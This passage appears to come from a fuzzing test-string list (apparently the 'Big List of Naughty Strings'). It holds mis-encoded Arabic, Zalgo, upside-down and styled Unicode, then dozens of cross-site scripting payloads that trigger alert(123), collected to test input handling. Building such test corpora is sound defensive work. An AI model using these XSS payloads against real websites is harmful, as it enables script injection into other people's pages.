    "￙ﾅ￙ﾏ￙ﾆ￙ﾎ￘ﾧ￙ﾂ￙ﾎ￘ﾴ￙ﾎ￘ﾩ￙ﾏ "
    "￘ﾳ￙ﾏ￘ﾨ￙ﾏ￙ﾄ￙ﾐ "
    "￘ﾧ￙ﾐ￘ﾳ￙ﾒ￘ﾪ￙ﾐ￘ﾮ￙ﾒ￘ﾯ￙ﾎ￘ﾧ￙ﾅ"
    "￙"
    "ﾐ"
    " "
    "￘ﾧ￙ﾄ￙ﾄ￙ﾑ￙ﾏ￘ﾺ￙ﾎ￘ﾩ￙ﾐ ￙ﾁ￙ﾐ￙ﾊ "
    "￘ﾧ￙ﾄ￙ﾆ￙ﾑ￙ﾏ￘ﾸ￙ﾏ￙ﾅ￙ﾐ "
    "￘ﾧ￙ﾄ￙ﾒ￙ﾂ￙ﾎ￘ﾧ￘ﾦ￙ﾐ￙ﾅ￙ﾎ￘ﾩ￙ﾐ "
    "￙ﾈ￙ﾎ￙ﾁ￙ﾐ￙ﾊ￙ﾅ "
    "￙ﾊ￙ﾎ￘ﾮ￙ﾏ￘ﾵ￙ﾑ￙ﾎ "
    "￘ﾧ￙ﾄ￘ﾪ￙ﾑ￙ﾎ￘ﾷ￙ﾒ￘ﾨ￙ﾐ￙ﾊ￙ﾂ￙ﾎ"
    "￘"
    "ﾧ"
    "￘"
    "ﾪ"
    "￙"
    "ﾏ"
    " "
    "￘ﾧ￙ﾄ￙ﾒ￘ﾭ￘ﾧ￘ﾳ￙ﾏ￙ﾈ￘ﾨ￙ﾐ￙ﾊ￙ﾑ"
    "￙"
    "ﾎ"
    "￘"
    "ﾩ"
    "￙"
    "ﾏ"
    "￘"
    "ﾌ"
    " ",

    //	Trick Unicode
    //
    //	Strings which contain unicode with unusual properties (e.g.
    // Right-to-left override) (c.f.
    // http://www.unicode.org/charts/PDF/U2000.pdf)

    "￢ﾀﾪ￢ﾀﾪtest￢ﾀﾪ", "￢ﾀﾫtest￢ﾀﾫ", "￢ﾀﾩtest￢ﾀﾩ",
    "test￢ﾁﾠtest￢ﾀﾫ", "￢ﾁﾦtest￢ﾁﾧ",

    //	Zalgo Text
    //
    //	Strings which contain \"corrupted\" text. The corruption will not appear
    // in non-HTML text, however. (via http://www.eeemo.net)

    "￡ﾹﾰￌﾺￌﾺￌﾕoￍﾞ "
    "ￌﾷiￌﾲￌﾬￍﾇￌﾪￍﾙnￌﾝￌﾗￍﾕvￌﾟￌﾜￌﾘￌﾦￍﾟoￌﾶￌﾙￌﾰￌ"
    "ﾠ"
    "k"
    "ￃ"
    "ﾨ"
    "ￍ"
    "ﾚ"
    "ￌ"
    "ﾮ"
    "ￌ"
    "ﾺ"
    "ￌ"
    "ﾪ"
    "ￌ"
    "ﾹ"
    "ￌ"
    "ﾱ"
    "ￌ"
    "ﾤ"
    " "
    "ￌﾖtￌﾝￍﾕￌﾳￌﾣￌﾻￌﾪￍﾞhￌﾼￍﾓￌﾲￌﾦￌﾳￌﾘￌﾲeￍﾇￌﾣￌﾰￌﾦￌﾬￍﾎ "
    "ￌﾢￌﾼￌﾻￌﾱￌﾘhￍﾚￍﾎￍﾙￌﾜￌﾣￌﾲￍﾅiￌﾦￌﾲￌﾣￌﾰￌﾤvￌﾻￍﾍeￌﾺￌﾭￌﾳￌﾪￌﾰ-"
    "mￌﾢiￍﾅnￌﾖￌﾺￌﾞￌﾲￌﾯￌﾰdￌﾵￌﾼￌﾟￍﾙￌﾩￌﾼￌﾘￌﾳ "
    "ￌﾞￌﾥￌﾱￌﾳￌﾭrￌﾛￌﾗￌﾘeￍﾙpￍﾠrￌﾼￌ"
    "ﾞ"
    "ￌ"
    "ﾻ"
    "ￌ"
    "ﾭ"
    "ￌ"
    "ﾗ"
    "e"
    "ￌ"
    "ﾺ"
    "ￌ"
    "ﾠ"
    "ￌ"
    "ﾣ"
    "ￍ"
    "ﾟ"
    "s"
    "ￌ"
    "ﾘ"
    "ￍ"
    "ﾇ"
    "ￌ"
    "ﾳ"
    "ￍ"
    "ﾍ"
    "ￌ"
    "ﾝ"
    "ￍ"
    "ﾉ"
    "e"
    "ￍ"
    "ﾉ"
    "ￌ"
    "ﾥ"
    "ￌ"
    "ﾯ"
    "ￌ"
    "ﾞ"
    "ￌ"
    "ﾲ"
    "ￍ"
    "ﾚ"
    "ￌ"
    "ﾬￍﾜￇﾹￌﾬￍﾎￍﾎￌﾟￌﾖￍﾇￌﾤtￍﾍￌﾬￌﾤￍﾓￌﾼￌﾭￍﾘￍﾅiￌﾪￌﾱnￍ"
    "ﾠ"
    "g"
    "ￌ"
    "ﾴ"
    "ￍ"
    "ﾉ"
    " "
    "ￍﾏￍﾉￍﾅcￌﾬￌﾟhￍﾡaￌﾫￌﾻￌﾯￍﾘoￌﾫￌﾟￌﾖￍﾍￌﾙￌﾝￍﾉsￌﾗￌﾦￌﾲ.ￌﾨￌﾹￍﾈￌﾣ",
    "ￌﾡￍﾓￌﾞￍﾅIￌﾗￌﾘￌﾦￍﾝnￍﾇￍﾇￍﾙvￌﾮￌﾫokￌﾲￌﾫￌﾙￍﾈiￌﾖￍﾙￌﾭￌﾹￌ"
    "ﾠ"
    "ￌ"
    "ﾞ"
    "n"
    "ￌ"
    "ﾡ"
    "ￌ"
    "ﾻ"
    "ￌ"
    "ﾮ"
    "ￌ"
    "ﾣ"
    "ￌ"
    "ﾺ"
    "g"
    "ￌ"
    "ﾲ"
    "ￍ"
    "ﾈ"
    "ￍ"
    "ﾙ"
    "ￌ"
    "ﾭ"
    "ￍﾙￌﾬￍﾎ ￌﾰtￍﾔￌﾦhￌﾞￌﾲeￌﾢￌﾤ "
    "ￍﾍￌﾬￌﾲￍﾖfￌﾴￌﾘￍﾕￌﾣￃﾨￍﾖ￡ﾺﾹￌﾥￌﾩlￍﾖￍﾔￍﾚiￍﾓￍﾚￌﾦￍ"
    "ﾠ"
    "n"
    "ￍ"
    "ﾖ"
    "ￍ"
    "ﾍ"
    "ￌ"
    "ﾗ"
    "ￍ"
    "ﾓ"
    "ￌ"
    "ﾳ"
    "ￌ"
    "ﾮ"
    "g"
    "ￍ"
    "ﾍ"
    " "
    "ￌﾨoￍﾚￌﾪￍﾡfￌﾘￌﾣￌﾬ "
    "ￌﾖￌﾘￍﾖￌﾟￍﾙￌﾮcￒﾉￍﾔￌﾫￍﾖￍﾓￍﾇￍﾖￍﾅhￌﾵￌﾤￌﾣￍﾚￍﾔￃﾡￌﾗￌﾼￍﾕￍﾅoￌﾼￌﾣￌﾥsￌﾱￍﾈￌﾺￌﾖￌﾦￌﾻￍﾢ."
    "ￌﾛￌﾖￌﾞￌﾠￌﾫￌﾰ",
    "ￌﾗￌﾺￍﾖￌﾹￌﾯￍﾓ￡ﾹﾮￌﾤￍﾍￌﾥￍﾇￍﾈhￌﾲￌﾁeￍﾏￍﾓￌﾼￌﾗￌﾙￌﾼￌﾣￍﾔ "
    "ￍﾇￌﾜￌﾱￌﾠￍﾓￍﾍￍﾅNￍﾕￍﾠeￌﾗￌﾱzￌ"
    "ﾘ"
    "ￌ"
    "ﾝ"
    "ￌ"
    "ﾜ"
    "ￌ"
    "ﾺ"
    "ￍ"
    "ﾙ"
    "p"
    "ￌ"
    "ﾤ"
    "ￌ"
    "ﾺ"
    "ￌ"
    "ﾹ"
    "ￍ"
    "ﾍ"
    "ￌ"
    "ﾯ"
    "ￍ"
    "ﾚ"
    "e"
    "ￌ"
    "ﾠ"
    "ￌ"
    "ﾻ"
    "ￌ"
    "ﾠ"
    "ￍ"
    "ﾜ"
    "r"
    "ￌ"
    "ﾨ"
    "ￌ"
    "ﾤ"
    "ￍ"
    "ﾍ"
    "ￌ"
    "ﾺ"
    "ￌﾖￍﾔￌﾖￌﾖdￌﾠￌﾟￌﾭￌﾬￌﾝￍﾟiￌﾦￍﾖ"
    "ￌ"
    "ﾩ"
    "ￍ"
    "ﾓ"
    "ￍ"
    "ﾔ"
    "ￌ"
    "ﾤ"
    "a"
    "ￌ"
    "ﾠ"
    "ￌ"
    "ﾗ"
    "ￌ"
    "ﾬ"
    "ￍ"
    "ﾉ"
    "ￌ"
    "ﾙ"
    "n"
    "ￍ"
    "ﾚ"
    "ￍ"
    "ﾜ"
    " "
    "ￌﾻￌﾞￌﾰￍﾚￍﾅhￌﾵￍﾉiￌﾳￌﾞvￌﾢￍﾇ￡ﾸﾙￍﾎￍﾟ-ￒﾉￌﾭￌﾩￌﾼￍﾔmￌﾤￌﾭￌﾫiￍﾕￍﾇￌﾝￌﾦnￌﾗￍﾙ￡ﾸﾍￌﾟ "
    "ￌﾯￌﾲￍﾕￍﾞￇﾫￌﾟￌﾯￌﾰￌﾲￍﾙￌﾻￌﾝf "
    "ￌﾪￌﾰￌﾰￌﾗￌﾖￌﾭￌﾘￍﾘcￌﾦￍﾍￌﾲￌﾞￍﾍￌﾩￌﾙ￡ﾸﾥￍﾚaￌﾮￍﾎￌﾟￌﾙￍﾜￆﾡￌﾩￌﾹￍﾎsￌﾤ.ￌﾝￌﾝ "
    "ￒﾉZￌﾡￌﾖￌﾜￍﾖￌﾰￌﾣￍﾉￌﾜaￍﾖￌﾰￍﾙￌﾬￍﾡlￌﾲￌﾫￌﾳￍﾍￌﾩgￌﾡￌﾟￌﾼￌﾱￍﾚￌﾞￌﾬￍﾅoￌﾗￍﾜ.ￌﾟ",
    "ￌﾦHￌﾬￌﾤￌﾗￌﾤￍﾝeￍﾜ ￌﾜￌﾥￌﾝￌﾻￍﾍￌﾟￌﾁwￌﾕhￌﾖￌﾯￍﾓoￌﾝￍﾙￌﾖￍﾎￌﾱￌﾮ "
    "ￒﾉￌﾺￌﾙￌﾞￌﾟￍﾈWￌﾷￌﾼￌﾭaￌﾺￌﾪￍﾍￄﾯￍﾈￍﾕￌﾭￍﾙￌﾯￌﾜtￌﾶￌﾼￌﾮsￌﾘￍﾙￍﾖￌﾕ "
    "ￌﾠￌﾫￌﾠBￌﾻￍﾍￍﾙￍﾉￌﾳￍﾅeￌﾵhￌﾵￌ"
    "ﾬ"
    "ￍ"
    "ﾇ"
    "ￌ"
    "ﾫ"
    "ￍ"
    "ﾙ"
    "i"
    "ￌ"
    "ﾹ"
    "ￍ"
    "ﾓ"
    "ￌ"
    "ﾳ"
    "ￌ"
    "ﾳ"
    "ￌ"
    "ﾮ"
    "ￍ"
    "ﾎ"
    "ￌ"
    "ﾫ"
    "ￌ"
    "ﾕ"
    "n"
    "ￍ"
    "ﾟ"
    "d"
    "ￌ"
    "ﾴ"
    "ￌ"
    "ﾪ"
    "ￌ"
    "ﾜ"
    "ￌ"
    "ﾖ"
    " "
    "ￌﾰￍﾉￌﾩￍﾇￍﾙￌﾲￍﾞￍﾅTￍﾖￌﾼￍﾓￌﾪￍﾢhￍﾏￍﾓￌﾮￌﾻeￌﾬￌﾝￌﾟￍﾅ "
    "ￌﾤￌﾹￌﾝWￍﾙￌﾞￌﾝￍﾔￍﾇￍﾝￍﾅaￍﾏￍﾓￍﾔￌﾹￌﾼￌﾣlￌﾴￍﾔￌﾰￌﾤￌﾟￍﾔ￡ﾸﾽￌﾫ.ￍﾕ",
    "Zￌﾮￌﾞￌﾠￍﾙￍﾔￍﾅ￡ﾸﾀￌﾗￌﾞￍﾈￌﾻￌ"
    "ﾗ"
    "￡"
    "ﾸ"
    "ﾶ"
    "ￍ"
    "ﾙ"
    "ￍ"
    "ﾎ"
    "ￌ"
    "ﾯ"
    "ￌ"
    "ﾹ"
    "ￌ"
    "ﾞ"
    "ￍ"
    "ﾓ"
    "G"
    "ￌ"
    "ﾻ"
    "O"
    "ￌ"
    "ﾭ"
    "ￌ"
    "ﾗ"
    "ￌ"
    "ﾮ",

    //	Unicode Upsidedown
    //
    //	Strings which contain unicode with an \"upsidedown\" effect (via
    // http://www.upsidedowntext.com)

    "ￋﾙ￉ﾐnb￡ﾴﾉl￉ﾐ ￉ﾐuￆﾃ￉ﾐ￉ﾯ ￇﾝ￉ﾹolop "
    "ￊﾇￇﾝ "
    "ￇﾝ￉ﾹoq￉ﾐl "
    "ￊﾇn "
    "ￊﾇunp￡ﾴﾉp￡ﾴﾉ￉ﾔu￡ﾴﾉ ￉ﾹod￉ﾯￇﾝￊﾇ "
    "po￉ﾯsn￡ﾴﾉￇﾝ "
    "op "
    "pￇﾝs "
    "'ￊﾇ￡ﾴﾉlￇﾝ "
    "ￆﾃu￡ﾴﾉ￉ﾔs￡ﾴﾉd￡ﾴﾉp￉ﾐ "
    "￉ﾹnￊﾇￇﾝￊﾇ￉ﾔￇﾝsuo￉ﾔ "
    "'ￊﾇￇﾝ￉ﾯ￉ﾐ "
    "ￊﾇ￡ﾴﾉs "
    "￉ﾹolop ￉ﾯnsd￡ﾴﾉ "
    "￉ﾯￇﾝ￉ﾹoￋﾥ",
    "00ￋﾙￆﾖ$-",

    //	Unicode font
    //
    //	Strings which contain bold/italic/etc. versions of normal characters

    "￯ﾼﾴ￯ﾽﾈ￯ﾽﾅ ￯ﾽﾑ￯ﾽﾕ￯ﾽﾉ￯ﾽﾃ￯ﾽﾋ "
    "￯ﾽﾂ￯ﾽﾒ￯ﾽﾏ￯ﾽﾗ￯ﾽﾎ "
    "￯ﾽﾆ￯ﾽﾏ￯ﾽﾘ ￯ﾽﾊ￯ﾽﾕ￯ﾽﾍ￯ﾽﾐ￯ﾽﾓ "
    "￯ﾽﾏ￯ﾽﾖ￯ﾽﾅ￯ﾽﾒ "
    "￯ﾽﾔ￯ﾽﾈ￯ﾽﾅ "
    "￯ﾽﾌ￯ﾽﾁ￯ﾽﾚ￯ﾽﾙ ￯ﾽﾄ￯ﾽﾏ￯ﾽﾇ",
    "￰ﾝﾐﾓ￰ﾝﾐﾡ￰ﾝﾐﾞ "
    "￰ﾝﾐﾪ￰ﾝﾐﾮ￰ﾝﾐﾢ￰ﾝﾐﾜ￰ﾝﾐﾤ "
    "￰ﾝﾐﾛ￰ﾝﾐﾫ￰ﾝﾐﾨ￰ﾝﾐﾰ￰ﾝﾐﾧ "
    "￰ﾝﾐﾟ￰ﾝﾐﾨ￰ﾝﾐﾱ "
    "￰ﾝﾐﾣ￰ﾝﾐﾮ￰ﾝﾐﾦ￰ﾝﾐﾩ￰ﾝﾐﾬ "
    "￰ﾝﾐﾨ￰ﾝﾐﾯ￰ﾝﾐﾞ￰ﾝﾐﾫ "
    "￰ﾝﾐﾭ￰ﾝﾐﾡ￰ﾝﾐﾞ "
    "￰ﾝﾐﾥ￰ﾝﾐﾚ￰ﾝﾐﾳ￰ﾝﾐﾲ "
    "￰ﾝﾐﾝ￰ﾝﾐﾨ￰ﾝﾐﾠ",
    "￰ﾝﾕ﾿￰ﾝﾖﾍ￰ﾝﾖﾊ "
    "￰ﾝﾖﾖ￰ﾝﾖﾚ￰ﾝﾖﾎ￰ﾝﾖﾈ￰ﾝﾖﾐ "
    "￰ﾝﾖﾇ￰ﾝﾖﾗ￰ﾝﾖﾔ￰ﾝﾖﾜ￰ﾝﾖﾓ "
    "￰ﾝﾖﾋ￰ﾝﾖﾔ￰ﾝﾖﾝ "
    "￰ﾝﾖﾏ￰ﾝﾖﾚ￰ﾝﾖﾒ￰ﾝﾖﾕ￰ﾝﾖﾘ "
    "￰ﾝﾖﾔ￰ﾝﾖﾛ￰ﾝﾖﾊ￰ﾝﾖﾗ "
    "￰ﾝﾖﾙ￰ﾝﾖﾍ￰ﾝﾖﾊ "
    "￰ﾝﾖﾑ￰ﾝﾖﾆ￰ﾝﾖﾟ￰ﾝﾖﾞ "
    "￰ﾝﾖﾉ￰ﾝﾖﾔ￰ﾝﾖﾌ",
    "￰ﾝﾑﾻ￰ﾝﾒﾉ￰ﾝﾒﾆ "
    "￰ﾝﾒﾒ￰ﾝﾒﾖ￰ﾝﾒﾊ￰ﾝﾒﾄ￰ﾝﾒﾌ "
    "￰ﾝﾒﾃ￰ﾝﾒﾓ￰ﾝﾒﾐ￰ﾝﾒﾘ￰ﾝﾒﾏ "
    "￰ﾝﾒﾇ￰ﾝﾒﾐ￰ﾝﾒﾙ "
    "￰ﾝﾒﾋ￰ﾝﾒﾖ￰ﾝﾒﾎ￰ﾝﾒﾑ￰ﾝﾒﾔ "
    "￰ﾝﾒﾐ￰ﾝﾒﾗ￰ﾝﾒﾆ￰ﾝﾒﾓ "
    "￰ﾝﾒﾕ￰ﾝﾒﾉ￰ﾝﾒﾆ "
    "￰ﾝﾒﾍ￰ﾝﾒﾂ￰ﾝﾒﾛ￰ﾝﾒﾚ "
    "￰ﾝﾒﾅ￰ﾝﾒﾐ￰ﾝﾒﾈ",
    "￰ﾝﾓﾣ￰ﾝﾓﾱ￰ﾝﾓﾮ "
    "￰ﾝﾓﾺ￰ﾝﾓﾾ￰ﾝﾓﾲ￰ﾝﾓﾬ￰ﾝﾓﾴ "
    "￰ﾝﾓﾫ￰ﾝﾓﾻ￰ﾝﾓﾸ￰ﾝﾔﾀ￰ﾝﾓﾷ "
    "￰ﾝﾓﾯ￰ﾝﾓﾸ￰ﾝﾔﾁ "
    "￰ﾝﾓﾳ￰ﾝﾓﾾ￰ﾝﾓﾶ￰ﾝﾓﾹ￰ﾝﾓﾼ "
    "￰ﾝﾓﾸ￰ﾝﾓ﾿￰ﾝﾓﾮ￰ﾝﾓﾻ "
    "￰ﾝﾓﾽ￰ﾝﾓﾱ￰ﾝﾓﾮ "
    "￰ﾝﾓﾵ￰ﾝﾓﾪ￰ﾝﾔﾃ￰ﾝﾔﾂ "
    "￰ﾝﾓﾭ￰ﾝﾓﾸ￰ﾝﾓﾰ",
    "￰ﾝﾕﾋ￰ﾝﾕﾙ￰ﾝﾕﾖ "
    "￰ﾝﾕﾢ￰ﾝﾕﾦ￰ﾝﾕﾚ￰ﾝﾕﾔ￰ﾝﾕﾜ "
    "￰ﾝﾕﾓ￰ﾝﾕﾣ￰ﾝﾕﾠ￰ﾝﾕﾨ￰ﾝﾕﾟ "
    "￰ﾝﾕﾗ￰ﾝﾕﾠ￰ﾝﾕﾩ "
    "￰ﾝﾕﾛ￰ﾝﾕﾦ￰ﾝﾕﾞ￰ﾝﾕﾡ￰ﾝﾕﾤ "
    "￰ﾝﾕﾠ￰ﾝﾕﾧ￰ﾝﾕﾖ￰ﾝﾕﾣ "
    "￰ﾝﾕﾥ￰ﾝﾕﾙ￰ﾝﾕﾖ "
    "￰ﾝﾕﾝ￰ﾝﾕﾒ￰ﾝﾕﾫ￰ﾝﾕﾪ "
    "￰ﾝﾕﾕ￰ﾝﾕﾠ￰ﾝﾕﾘ",
    "￰ﾝﾚﾃ￰ﾝﾚﾑ￰ﾝﾚﾎ "
    "￰ﾝﾚﾚ￰ﾝﾚﾞ￰ﾝﾚﾒ￰ﾝﾚﾌ￰ﾝﾚﾔ "
    "￰ﾝﾚﾋ￰ﾝﾚﾛ￰ﾝﾚﾘ￰ﾝﾚﾠ￰ﾝﾚﾗ "
    "￰ﾝﾚﾏ￰ﾝﾚﾘ￰ﾝﾚﾡ "
    "￰ﾝﾚﾓ￰ﾝﾚﾞ￰ﾝﾚﾖ￰ﾝﾚﾙ￰ﾝﾚﾜ "
    "￰ﾝﾚﾘ￰ﾝﾚﾟ￰ﾝﾚﾎ￰ﾝﾚﾛ "
    "￰ﾝﾚﾝ￰ﾝﾚﾑ￰ﾝﾚﾎ "
    "￰ﾝﾚﾕ￰ﾝﾚﾊ￰ﾝﾚﾣ￰ﾝﾚﾢ "
    "￰ﾝﾚﾍ￰ﾝﾚﾘ￰ﾝﾚﾐ",
    "￢ﾒﾯ￢ﾒﾣ￢ﾒﾠ ￢ﾒﾬ￢ﾒﾰ￢ﾒﾤ￢ﾒﾞ￢ﾒﾦ "
    "￢ﾒﾝ￢ﾒﾭ￢ﾒﾪ￢ﾒﾲ￢ﾒﾩ "
    "￢ﾒﾡ￢ﾒﾪ￢ﾒﾳ "
    "￢ﾒﾥ￢ﾒﾰ￢ﾒﾨ￢ﾒﾫ￢ﾒﾮ "
    "￢ﾒﾪ￢ﾒﾱ￢ﾒﾠ￢ﾒﾭ "
    "￢ﾒﾯ￢ﾒﾣ￢ﾒﾠ "
    "￢ﾒﾧ￢ﾒﾜ￢ﾒﾵ￢ﾒﾴ "
    "￢ﾒﾟ￢ﾒﾪ￢ﾒﾢ",

    //	Script Injection
    //
    //	Strings which attempt to invoke a benign script injection; shows
    // vulnerability to XSS

    "<script>alert(123)</script>",
    "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
    "<img src=x onerror=alert(123) />",
    "<svg><script>123<1>alert(123)</script>", "\"><script>alert(123)</script>",
    "'><script>alert(123)</script>", "><script>alert(123)</script>",
    "</script><script>alert(123)</script>",
    "< / script >< script >alert(123)< / script >",
    " onfocus=JaVaSCript:alert(123) autofocus",
    "\" onfocus=JaVaSCript:alert(123) autofocus",
    "' onfocus=JaVaSCript:alert(123) autofocus",
    "￯ﾼﾜscript￯ﾼﾞalert(123)￯ﾼﾜ/script￯ﾼﾞ",
    "<sc<script>ript>alert(123)</sc</script>ript>",
    "--><script>alert(123)</script>", "\";alert(123);t=\"", "';alert(123);t='",
    "JavaSCript:alert(123)", ";alert(123);", "src=JaVaSCript:prompt(132)",
    "\"><script>alert(123);</script x=\"", "'><script>alert(123);</script x='",
    "><script>alert(123);</script x=",
    "\" autofocus onkeyup=\"javascript:alert(123)",
    "' autofocus onkeyup='javascript:alert(123)",
    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
    "'`\"><\\x3Cscript>javascript:alert(1)</script>",
    "'`\"><\\x00script>javascript:alert(1)</script>",
    "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
    "<a href=\"\\x0Bjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Fjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x05javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x18javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x11javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x17javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x03javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Ejavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Ajavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x00javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x10javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x20javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x13javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x09javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x14javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x19javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Fjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Djavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x07javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x04javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x01javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x08javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x12javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Djavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Ajavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Cjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x15javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x16javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x02javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Bjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x06javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Ejavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" "
    "id=\"fuzzelement1\">test</a>",
